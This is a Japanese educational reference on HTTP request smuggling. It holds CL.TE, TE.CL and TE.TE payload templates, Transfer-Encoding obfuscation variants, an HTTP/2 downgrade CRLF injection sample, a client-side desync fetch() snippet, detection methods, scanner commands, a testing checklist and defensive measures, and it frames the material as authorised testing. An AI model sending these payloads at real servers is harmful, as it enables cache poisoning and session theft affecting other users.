ラボ1・2の悪用が「1回の攻撃で1つの効果（アクセス制御回避、1人分のCookie窃取）」にとどまるのに対し、キャッシュポイズニングとの連鎖は「1回のキャッシュ書き込みで、以降アクセスする不特定多数の被害者全員」に影響が及ぶ点で質的に異なる。キャッシュはパフォーマンス向上のために「一度計算した結果を使い回す」仕組みだが、その「使い回し」の判定基準（キャッシュキー）がリクエストスマグリングによって偽装可能になると、キャッシュそのものが攻撃の配信インフラに転化してしまう。防御側の対策としては、根本的にはフロントエンドとバックエンドのHTTPパーサー実装を統一・強化してデシンクの発生自体を防ぐことが最優先だが、キャッシュ層に関しては「キャッシュするレスポンスの範囲を静的アセットなど安全なものに限定する」「Hostヘッダーなどリクエストの信頼できない部分をキャッシュキーの構成要素として安易に使わない」といった多層防御も有効である。これらの防御策の詳細は後続の章でまとめて扱う。

> 出典: Perform web cache poisoning via HTTP request smuggling — https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning

### まとめ: 3ラボが示す「1つのバグ、3つの射程」

3つのラボは、いずれも同一の根本原因（フロントエンドとバックエンドのCL/TE解釈のズレ）から出発しながら、悪用の射程がまったく異なることを示している。

| ラボ | 悪用対象 | 影響範囲 | 核心テクニック |
|---|---|---|---|
| 1. フロントエンド書き換え露出 | 自分自身のリクエスト解析 | 攻撃者自身の権限昇格 | プレフィックス注入＋リフレクションによる可視化 |
| 2. 他ユーザーのリクエスト捕捉 | 他ユーザーのリクエスト本文 | 特定被害者のセッション窃取 | オーバーサイズContent-Lengthによる後続リクエストの取り込み |
| 3. キャッシュポイズニング連鎖 | 共有キャッシュのキー空間 | 不特定多数の被害者 | キャッシュキーとバックエンド処理対象のURLのズレ悪用 |

いずれのテクニックも、根っこにあるのは「フロントエンドが**見ているつもりのリクエスト境界**」と「バックエンドが**実際に読み取るリクエスト境界**」のズレという1点である。このズレをどこに、どのような形で挿入するか（自分のリクエストの末尾に混ぜる、他人のリクエストを飲み込ませる、キャッシュされるURLとキャッシュされないURLを入れ替える）によって、影響の質と範囲がまったく別物になる、という点が本節の核心である。次節では、これらの検出・悪用を安全に、かつ体系的に行うための方法論と、根本的な防御策を扱う。

## チートシート・方法論リファレンス

この節は、第3章で学んだCL.TE / TE.CL / TE.TEの原理を「手を動かすときに即座に参照できる形」にまとめたリファレンスである。実際の検証現場では、ペイロードの一字一句の正確さ（バイト数のズレ一つで検出が失敗する）と、検出→確証→影響評価という手順の順守が成否を分ける。以下では3つの実務資料——PayloadsAllTheThingsのチートシート、The Hacker Recipesの方法論、Pentest Book（six2dez）の列挙手順——から、ペイロード雛形・判定基準・ツール・手順を統合して提示する。防御目的の検証を前提とし、実在サービスへの無許可検証や破壊的な手順（他ユーザーへの副作用を伴う本番実行など）はここでは扱わない。

### 3つの古典分類のペイロード雛形

まず、CL.TE/TE.CL/TE.TEそれぞれの「型」を、実際に送信するバイト列のレベルで確認する。ここでの「フロントエンド」はリバースプロキシ・ロードバランサ・CDNなど最初にリクエストを受ける層、「バックエンド」はアプリケーションサーバーを指す。

#### CL.TE（フロントエンドがContent-Length、バックエンドがTransfer-Encodingを採用）

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

なぜこれが機能するか。フロントエンドはContent-Lengthヘッダを信頼するため、ボディの先頭13バイト（`0\r\n\r\nSMUGGLED`のうち「0」から始まる13バイト分）だけを見てリクエストの終端と判断し、そのまま丸ごとバックエンドへ転送する。一方バックエンドはTransfer-Encoding: chunkedを信頼するため、ボディをchunked形式として解釈する。`0\r\n\r\n`は「サイズ0のチャンク＝ボディ終端」を意味するchunked encodingの正式な終了マーカーであり、バックエンドはここでリクエストが終わったと判断する。したがって、その直後にある`SMUGGLED`という文字列は「このリクエストの一部」ではなく「次に届くリクエストの先頭バイト列」として、コネクション上でキューイングされている次のリクエストに結合されてしまう。これがフロントエンド／バックエンド間の解釈の食い違い（desync、脱同期）の本質である。

#### TE.CL（フロントエンドがTransfer-Encoding、バックエンドがContent-Lengthを採用）

```http
POST / HTTP/1.1
Host: domain.example.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0

```

なぜこれが機能するか。フロントエンドはTransfer-Encodingを信頼してchunked形式として読み進める。`5c`（16進数で92）は後続チャンクのバイト数を示し、フロントエンドはその分（`GPOST / HTTP/1.1...`から始まる92バイト）を読み、続く`0\r\n\r\n`で終端と判断してリクエスト全体を転送する。一方バックエンドはContent-Length: 4のみを信頼するため、ボディの先頭4バイト（`5c\r\n`）だけを「今回のリクエストのボディ」として処理し、そこで区切りを打つ。残りの`GPOST / HTTP/1.1\r\n...`以降は「次のリクエスト」としてバックエンドのパーサに再解釈される。結果として、`GPOST`という不正なメソッド名を含む偽装リクエストがバックエンドのリクエストキューに割り込む。**実務上の重要な注意点**として、この末尾には`\r\n\r\n`（空行）を必ず付与する必要がある。これを欠くと、バックエンドが次の本物のリクエストの先頭行を巻き込んでヘッダ行として誤読し、検出結果が不安定になる。またBurp SuiteのRepeaterでこの種のリクエストを送る際は「Update Content-Length on Send」オプションを無効化しなければならない。有効なままだと、Burpが自動的にContent-Length値を実際のボディ長に書き換えてしまい、意図的に作り込んだ「フロントエンドとバックエンドで異なる長さ解釈をさせる」というズレそのものが消えてしまうためである。

#### TE.TE（両者ともTransfer-Encodingに対応するが、片方だけを難読化で無効化させる）

CL.TEやTE.CLは「そもそも片方のサーバーがTransfer-Encodingを一切解釈しない」ケースだが、TE.TEは両者ともTransfer-Encodingヘッダの存在自体は認識できるサーバー同士の組み合わせで、ヘッダ値を意図的に崩すことで一方だけの解釈を無効化させる手法である。

```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[改行]Transfer-Encoding: chunked
Transfer-Encoding
 : chunked
```

なぜこれが機能するか。RFC 9112はTransfer-Encodingヘッダの構文について比較的緩い実装が歴史的に許容されてきた経緯があり、実装によっては「ヘッダ名の直後にスペースがある（`Transfer-Encoding : chunked`）」「値の前にタブや余分な空白が挟まる」「ヘッダ値が`chunked`という正確な文字列と完全一致しない（`xchunked`や単なる`x`）」といった異形を、あるサーバーは「無効なヘッダなので無視する」と判断し、別のサーバーは「多少崩れていても`chunked`という文字列を含むので有効とみなす」と判断する。この寛容性の差そのものが脆弱性になる。攻撃者は、フロントエンドには「無効」と判定させて素通りさせつつ、バックエンドには「有効なchunked」と判定させる（あるいはその逆）ヘッダ値を探索することで、CL.TEやTE.CLと同様の脱同期を発生させる。

> 出典: HTTP Request Smuggling — PayloadsAllTheThings — https://swisskyrepo.github.io/PayloadsAllTheThings/Request%20Smuggling/

### HTTP/2関連の発展形（H2.CL / H2.TE、クライアントサイドデシンク）

古典3分類はHTTP/1.1同士の通信を前提とするが、フロントエンドがHTTP/2でクライアントを受け付けてバックエンドへHTTP/1.1へダウングレードして転送する構成（多くのCDN・ロードバランサでデフォルト）では、別の攻撃面が生まれる。HTTP/2はバイナリフレーミングでヘッダとボディの境界が明確なため、原理上はContent-Length/Transfer-Encodingの曖昧さは存在しない。しかし、フロントエンドがHTTP/2からHTTP/1.1へ変換する過程で、擬似ヘッダやフィールド内に混入したCRLF・改行を適切にエスケープしないと、変換後のHTTP/1.1リクエストにヘッダインジェクションが発生し得る。

```
:method GET
:path /
:authority www.example.com
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: www.example.com
```

なぜこれが機能するか。HTTP/2のヘッダフィールドは本来CRLFを含めてもそのままバイナリとして扱われる（フレーム構造で区切られているため改行文字に構文上の意味はない）。ところがダウングレード時にフロントエンドがこの値をHTTP/1.1のテキスト形式のヘッダ行としてそのまま書き出すと、値中の`\r\n\r\n`が「ヘッダ終端＋ボディ開始」として解釈され、それ以降の文字列がバックエンドにとっては「新しいリクエストの先頭」に見えてしまう。これはH2.CL / H2.TEというラベルで呼ばれることもあるが、本質はCL.TE/TE.CLと同じ「層ごとの解釈の不一致」である。

さらに近年注目されているのがクライアントサイドデシンク（Client-Side Desync, CSD）である。これは攻撃者がサーバー側のフロントエンド／バックエンドを直接操作するのではなく、被害者のブラウザに偽装リクエストを送らせることで、被害者自身のコネクション上でデシンクを発生させる手法である。

```javascript
fetch('https://www.example.com/', {
  method: 'POST',
  body: "GET / HTTP/1.1\r\nHost: www.example.com",
  mode: 'no-cors',
  credentials: 'include'
})
```

なぜこれが機能するか。一部のサーバー実装は、あるパス（例えば静的リソースを返すエンドポイント）に対してPOSTでリクエストが来ても、実際にはボディを一切読まずにGETと同じ扱いで即座にレスポンスを返す。このときPOSTのボディに書き込んだ`GET / HTTP/1.1\r\nHost: ...`という文字列は、サーバー側では読み捨てられるべきものだが、コネクションの再利用（keep-alive）が行われている場合、後続の別ユーザー（あるいは被害者自身の次のリクエスト）と混ざってバックエンド側に予期しない形で解釈される余地が生まれる。CSDは攻撃者のサーバーインフラへの直接アクセスを必要とせず、被害者にJavaScriptを実行させるだけで成立する点が古典的スマグリングと大きく異なる。攻撃結果としては、認証情報の窃取、被害者のセッション上でのXSS注入、内部限定エンドポイントの踏み台化などが挙げられる。

> 出典: HTTP Request Smuggling — PayloadsAllTheThings — https://swisskyrepo.github.io/PayloadsAllTheThings/Request%20Smuggling/

### 検出方法論：タイミングベースと差分レスポンス

The Hacker Recipesは、実務での検出を「タイミング遅延技法」と「差分レスポンス技法」の2系統に整理している。

**タイミングベース検出**は、意図的に曖昧なリクエストを送信し、レスポンスが返るまでの時間を観測する手法である。例えばCL.TEの疑いがある場合、Content-Lengthを実際のボディより小さく申告しつつTransfer-Encodingヘッダを付与したリクエストを送る。バックエンドがchunked encodingとして解釈した結果、終端のゼロチャンク（`0\r\n\r\n`）が見当たらない状態になると、バックエンドは「まだボディが続く」と判断してタイムアウトまで待機し続ける。この待機時間の異常な長さ（例えば通常数百ミリ秒のレスポンスが数秒〜数十秒に伸びる）が、脆弱性の兆候になる。タイミングベースは他ユーザーへの副作用がほぼないため、本番相当の環境で最初に試す手法として推奨される。

**差分レスポンス技法**は、スマグリングしたリクエストが実際にキューに割り込んで処理されたかどうかを、後続リクエストのレスポンス内容の変化で確認する手法である。具体的には、1本目の接続でスマグリング用リクエストを送った直後に、2本目（正規の）リクエストを同じコネクション上に送信し、2本目のレスポンスが「本来期待される内容」から逸脱していないかを見る。逸脱していれば、1本目のリクエストの残骸（あるいは注入した偽装リクエスト）が2本目の処理に混入した証拠となる。この手法は確証を得る力が強い一方、実サービスの他ユーザーのリクエストを巻き込むリスクがあるため、検証環境や自分専用のテストアカウント経由でのみ用いるべきである。

Pentest Bookはこれをさらに具体的な検出手順として提示している。

**CL.TE検出の手順**：Content-Length: 4を指定しつつ、実際のボディにはchunked形式で余分な文字（例えば`X`という1バイト）を追加したリクエストを送る。フロントエンドはContent-Length: 4の分だけを読んで転送するため、`X`はバックエンドに渡らずコネクション上に取り残される。次に同じコネクション上で2本目のリクエストを送ると、取り残されていた`X`がそのリクエストの先頭に結合され、バックエンドはリクエスト行が`X`から始まる不正な形式として解釈し、パースエラーやステータスコードの異常（400番台など）として観測される。

**TE.CL検出の手順**：Transfer-Encoding: chunkedを主軸にしつつ、Content-Length: 4のような小さい値を併記する。chunkedボディの中に、意図的に不正なメソッド名を持つ埋め込みリクエスト（例えば`GPOST`のような、実在しないメソッド名）を仕込む。バックエンドがContent-Lengthのみを信頼していれば、chunkedの構造を無視して先頭4バイトだけを読み、残りを次のリクエストとして再パースしようとする。この際`GPOST`という不正な行がリクエストラインとして読まれ、パースエラーやステータス異常が発生すれば、TE.CLの脆弱性が示唆される。

**TE.TE検出の手順**：Transfer-Encodingヘッダに崩した値（例えば`Transfer-encoding: cow`のような、ヘッダ名の大文字小文字や値そのものを変形したもの）を追加した状態で送信する。これによって、一方のサーバーはこのヘッダを無効と判断してTransfer-Encodingを無視し、他方は有効と判断してchunked処理を行う、という解釈の分岐を誘発できるかを確認する。

> 出典: request-smuggling — Pentest Book (six2dez) — https://www.pentest-book.com/enumeration/web/request-smuggling

### 検証・自動化ツール

手動でのバイト単位のペイロード作成は学習段階では不可欠だが、実務では以下のツールで一次スクリーニングを行い、疑わしい候補に対してのみ手動での確証作業を行うのが効率的である。

```bash
# smuggler（defparam製、Python3実装）
# 単一ホストまたはURLリストに対してCL.TE/TE.CL/TE.TEの自動検出を行う
python3 smuggler.py -u https://target.example.com

# smuggle.py（anshumanpattnaik製、別実装）
python3 smuggle.py -u https://target.example.com

# h2csmuggler（BishopFox/assetnote製、Go実装）
# HTTP/2クリアテキスト（h2c）へのアップグレード経由のスマグリングを検証
go run ./cmd/h2csmuggler check https://target.example.com
```

なぜこれらのツールが有効か。いずれも、上述したCL.TE/TE.CL/TE.TE検出手順（曖昧なヘッダの組み合わせを機械的に生成し、タイミングまたはレスポンス差分を観測する）を自動化したものであり、多数のエンドポイント・パラメータの組み合わせを人手より高速に走査できる。ただし自動ツールは「疑わしい兆候」を報告するに留まり、実際に悪用可能かどうか（他ユーザーのリクエストに実害を及ぼせるか）の最終確証は、影響範囲を限定した手動検証で行う必要がある。これはスマグリングが「検証の失敗自体が他ユーザーへの副作用を生みうる、数少ない脆弱性クラスの一つ」であるためであり、本番相当の環境で不用意に自動スキャンを乱発すべきではない。

Burp Suite環境では、**HTTP Request Smuggler拡張機能**が標準的な選択肢となる。この拡張は、既知の曖昧化パターンを自動的に多数試行するスキャン機能に加え、Turbo Intruderと連携してタイミング攻撃を高精度に実行する機能、および手動でペイロードを組み立てる際にContent-Lengthを自動計算する補助機能を備える。特にContent-Lengthの自動計算は、TE.CLペイロードのような「意図的に短く申告する」ケースでは無効化が必須である点に注意する（前述のBurp Repeaterの注意点と同様）。

### 方法論としてのチェックリスト

The Hacker Recipesは、検証を段階的なフェーズとして整理している。これを防御的な観点（＝どこを塞げば各フェーズが成立しなくなるか）とあわせて再構成すると次のようになる。

1. **フロントエンド／バックエンドの多段構成の有無を確認する** — 単一サーバー構成ではスマグリングは原理的に成立しない。CDN・リバースプロキシ・ロードバランサを経由しているか、レスポンスヘッダ（Server、Via、X-Cache等）やインフラの公開情報から推定する。
2. **どちらのヘッダが優先されるか（CL.TE / TE.CL / TE.TE）を確定する** — タイミングベース検出を用い、副作用を避けながら型を絞り込む。
3. **HTTP/2からHTTP/1.1へのダウングレードの有無を確認する** — ダウングレードが行われている場合、H2.CL/H2.TEやCRLFインジェクションの経路が追加される。
4. **タイミング遅延・差分レスポンスの兆候を確証する** — 疑わしい型が絞れたら、影響を限定した形で差分レスポンス検証を行い、実際にキューへの割り込みが起きているかを確認する。
5. **バイト数を正確に調整し、後続処理への影響を検証する** — Content-Lengthや chunkサイズのわずかなズレが検出の成否を左右するため、ここが最も手作業を要するフェーズである。

防御側は、このチェックリストの各段階に対応する形で対策を講じることができる。すなわち、(1)多段構成そのものを見直しHTTP/2をエンドツーエンドで統一する、(2)フロントエンド・バックエンド双方でContent-LengthとTransfer-Encodingが同時に存在するリクエストを拒否する、(3)HTTP/2→HTTP/1.1ダウングレード時のヘッダ値のサニタイズを徹底する、(4)(5)いずれにせよ、リクエストの構文検証をRFC準拠で厳格化し、曖昧な入力を「寛容に解釈して通す」のではなく「明確に拒否する」方針に統一することが、これら全フェーズを無力化する最も一般的な防御である。

> 出典: HTTP request smuggling — The Hacker Recipes — https://www.thehacker.recipes/web/config/http-request-smuggling/

### 実務上の落とし穴（3資料共通の注意点）

最後に、3資料に共通して強調されている、検証時に見落としがちな点を整理する。

- **Content-Lengthの自動更新機能**：Burp RepeaterなどのGUIツールは、送信時にボディの実長へ合わせてContent-Lengthを書き換える機能を持つことが多い。スマグリングの検証では「意図的に不正確な値を送る」ことが前提のため、この自動更新は必ず無効化する。
- **末尾の空行（`\r\n\r\n`）の有無**：TE.CL型のペイロードでは、最終チャンク（`0`）の後に空行が欠けていると、バックエンドが後続の正規リクエストの先頭を巻き込んで誤読し、検出結果が不安定になる。
- **ヘッダ名・値の微細な変形への実装依存**：TE.TE型の難読化パターン（大文字小文字、空白、タブ、改行の挿入位置）は、対象サーバーソフトウェア（nginx、Apache、各種CDN等）ごとに有効なパターンが異なる。単一のパターンで「脆弱性なし」と結論づけず、複数パターンを試す必要がある。ただし本番環境での網羅的な試行は副作用リスクを伴うため、検証環境での事前確認を徹底する。
- **副作用への配慮**：差分レスポンス検証は他ユーザーのリクエストに影響しうる。実サービスでの検証は、自分専用のテストアカウント・専用コネクションに限定し、他ユーザーへの実害を発生させる手順（セッションハイジャックの実演等）は行わない。
